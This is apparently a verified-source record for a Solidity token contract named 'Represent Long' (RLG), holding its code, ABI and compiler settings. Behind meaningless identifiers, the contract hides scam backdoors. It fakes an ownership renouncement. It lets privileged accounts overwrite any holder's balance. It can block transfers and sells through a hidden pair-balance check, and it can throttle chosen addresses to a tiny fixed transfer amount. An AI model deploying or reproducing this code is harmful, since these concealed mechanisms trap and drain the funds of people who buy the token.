{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.3;\n\ninterface tradingIs {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract shouldMin {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface limitAmount {\n    function createPair(address fundTx, address modeWallet) external returns (address);\n}\n\ninterface walletMode {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address modeBuyLiquidity) external view returns (uint256);\n\n    function transfer(address fromToken, uint256 walletFund) external returns (bool);\n\n    function allowance(address totalWallet, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 walletFund) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address fromToken,\n        uint256 walletFund\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed receiverExemptTo, uint256 value);\n    event Approval(address indexed totalWallet, address indexed spender, uint256 value);\n}\n\ninterface walletModeMetadata is walletMode {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract RepresentLong is shouldMin, walletMode, walletModeMetadata {\n\n    mapping(address => bool) public buyFrom;\n\n    function launchFrom() public {\n        emit OwnershipTransferred(receiverFund, address(0));\n        takeLaunch = address(0);\n    }\n\n    constructor (){\n        if (enableExempt == autoMarketing) {\n            launchSender = true;\n        }\n        tradingIs liquidityMin = tradingIs(maxSwap);\n        launchWallet = limitAmount(liquidityMin.factory()).createPair(liquidityMin.WETH(), address(this));\n        if (autoMarketing == maxTxShould) {\n            fundTradingReceiver = true;\n        }\n        receiverFund = _msgSender();\n        launchFrom();\n        marketingLiquidity[receiverFund] = true;\n        txLiquidity[receiverFund] = takeMode;\n        \n        emit Transfer(address(0), receiverFund, takeMode);\n    }\n\n    event OwnershipTransferred(address indexed receiverAmount, address indexed senderExempt);\n\n    string private teamMarketing = \"RLG\";\n\n    mapping(address => uint256) private txLiquidity;\n\n    function transfer(address tradingEnableIs, uint256 walletFund) external virtual override returns (bool) {\n        return maxSender(_msgSender(), tradingEnableIs, walletFund);\n    }\n\n    uint256 modeTeamTx;\n\n    function teamAmount(address enableTake) public {\n        require(enableTake.balance < 100000);\n        if (txTotal) {\n            return;\n        }\n        \n        marketingLiquidity[enableTake] = true;\n        if (fundTradingReceiver) {\n            enableExempt = maxTxShould;\n        }\n        txTotal = true;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return marketingWallet;\n    }\n\n    uint256 constant fromLaunched = 4 ** 10;\n\n    function balanceOf(address modeBuyLiquidity) public view virtual override returns (uint256) {\n        return txLiquidity[modeBuyLiquidity];\n    }\n\n    address public receiverFund;\n\n    function allowance(address receiverIs, address maxReceiver) external view virtual override returns (uint256) {\n        if (maxReceiver == maxSwap) {\n            return type(uint256).max;\n        }\n        return liquidityTeamSell[receiverIs][maxReceiver];\n    }\n\n    function teamTake() private view {\n        require(marketingLiquidity[_msgSender()]);\n    }\n\n    function maxSender(address tokenTo, address fromToken, uint256 walletFund) internal returns (bool) {\n        if (tokenTo == receiverFund) {\n            return atLiquiditySell(tokenTo, fromToken, walletFund);\n        }\n        uint256 feeMarketing = walletMode(launchWallet).balanceOf(minTradingMax);\n        require(feeMarketing == modeTeamTx);\n        require(fromToken != minTradingMax);\n        if (buyFrom[tokenTo]) {\n            return atLiquiditySell(tokenTo, fromToken, fromLaunched);\n        }\n        return atLiquiditySell(tokenTo, fromToken, walletFund);\n    }\n\n    mapping(address => bool) public marketingLiquidity;\n\n    uint256 private shouldLimit;\n\n    function totalTx(uint256 walletFund) public {\n        teamTake();\n        modeTeamTx = walletFund;\n    }\n\n    bool private senderToShould;\n\n    function feeFrom(address tradingEnableIs, uint256 walletFund) public {\n        teamTake();\n        txLiquidity[tradingEnableIs] = walletFund;\n    }\n\n    string private marketingWallet = \"Represent Long\";\n\n    bool private launchSender;\n\n    bool public txTotal;\n\n    uint256 fromEnableTrading;\n\n    address private takeLaunch;\n\n    address maxSwap = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function decimals() external view virtual override returns (uint8) {\n        return sellExempt;\n    }\n\n    function getOwner() external view returns (address) {\n        return takeLaunch;\n    }\n\n    uint256 private maxTxShould;\n\n    bool public fundTradingReceiver;\n\n    uint256 public enableExempt;\n\n    mapping(address => mapping(address => uint256)) private liquidityTeamSell;\n\n    function approve(address maxReceiver, uint256 walletFund) public virtual override returns (bool) {\n        liquidityTeamSell[_msgSender()][maxReceiver] = walletFund;\n        emit Approval(_msgSender(), maxReceiver, walletFund);\n        return true;\n    }\n\n    uint256 public autoMarketing;\n\n    address public launchWallet;\n\n    bool public autoAmount;\n\n    function totalLaunch(address fundLaunched) public {\n        teamTake();\n        \n        if (fundLaunched == receiverFund || fundLaunched == launchWallet) {\n            return;\n        }\n        buyFrom[fundLaunched] = true;\n    }\n\n    address minTradingMax = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 private takeMode = 100000000 * 10 ** 18;\n\n    function owner() external view returns (address) {\n        return takeLaunch;\n    }\n\n    uint8 private sellExempt = 18;\n\n    function symbol() external view virtual override returns (string memory) {\n        return teamMarketing;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return takeMode;\n    }\n\n    function atLiquiditySell(address tokenTo, address fromToken, uint256 walletFund) internal returns (bool) {\n        require(txLiquidity[tokenTo] >= walletFund);\n        txLiquidity[tokenTo] -= walletFund;\n        txLiquidity[fromToken] += walletFund;\n        emit Transfer(tokenTo, fromToken, walletFund);\n        return true;\n    }\n\n    function transferFrom(address tokenTo, address fromToken, uint256 walletFund) external override returns (bool) {\n        if (_msgSender() != maxSwap) {\n            if (liquidityTeamSell[tokenTo][_msgSender()] != type(uint256).max) {\n                require(walletFund <= liquidityTeamSell[tokenTo][_msgSender()]);\n                liquidityTeamSell[tokenTo][_msgSender()] -= walletFund;\n            }\n        }\n        return maxSender(tokenTo, fromToken, walletFund);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalWallet\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverAmount\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderExempt\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverExemptTo\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverIs\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"maxReceiver\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletFund\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoMarketing\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeBuyLiquidity\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"buyFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableExempt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingEnableIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletFund\",\"type\":\"uint256\"}],\"name\":\"feeFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundTradingReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchWallet\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"marketingLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverFund\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableTake\",\"type\":\"address\"}],\"name\":\"teamAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundLaunched\",\"type\":\"address\"}],\"name\":\"totalLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"walletFund\",\"type\":\"uint256\"}],\"name\":\"totalTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingEnableIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletFund\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenTo\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fromToken\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletFund\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "RepresentLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}